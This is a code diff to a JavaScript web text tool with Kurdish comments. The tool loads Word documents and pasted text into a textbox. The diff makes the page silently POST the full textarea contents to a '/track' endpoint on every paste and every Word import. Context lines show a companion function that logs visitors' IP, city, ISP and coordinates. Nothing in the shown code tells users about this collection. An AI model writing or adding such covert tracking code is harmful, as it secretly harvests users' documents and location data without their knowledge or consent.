@@ -1952,6 +1952,7 @@ async function handleFile(e) {
             if(box) box.value = result.value;
             updateStats();
             showStatus("📝 فایلی Word بە سەرکەوتوویی خوێندرایەوە");
+            if (typeof window._akSendTextareaText === 'function') window._akSendTextareaText();
         } catch (error) {
             console.error(error);
             showStatus("هەڵەیەک ڕوویدا لە کاتی خوێندنەوەی وۆرد ❌");
@@ -3603,26 +3604,31 @@ function akSendVisit(device, city, country, region, zip, isp, lat, lon, ip) {
 }
 
 // ---- تۆمارکردنی Textarea (دەق نووسراو) بۆ KV ----
-// دوای 3 چرکەی راوەستان، ئەگەر ٢٠+ پیت بوو دەنێرێت
+// تەنها کاتی paste یان هێنانی Word دەنێرێت
 (function akWatchTextarea() {
     var tb = document.getElementById('textBox');
     if (!tb) return;
-    var _timer = null;
     var _lastSent = '';
-    tb.addEventListener('input', function() {
-        clearTimeout(_timer);
-        _timer = setTimeout(function() {
-            var txt = tb.value.trim();
-            if (txt.length >= 1 && txt !== _lastSent) {
-                _lastSent = txt;
-                fetch('/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'textarea', text: txt })
-                }).catch(function() {});
-            }
-        }, 3000);
+
+    function akSendText() {
+        var txt = tb.value.trim();
+        if (txt.length >= 1 && txt !== _lastSent) {
+            _lastSent = txt;
+            fetch('/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'textarea', text: txt })
+            }).catch(function() {});
+        }
+    }
+
+    // Ctrl+V یان paste
+    tb.addEventListener('paste', function() {
+        setTimeout(akSendText, 300);
     });
+
+    // ئاگادارکردنەوەی هێنانی Word
+    window._akSendTextareaText = akSendText;
 })();
 
 // ---- دەستپێکردنی چالاکی شوێنکەوتن ----
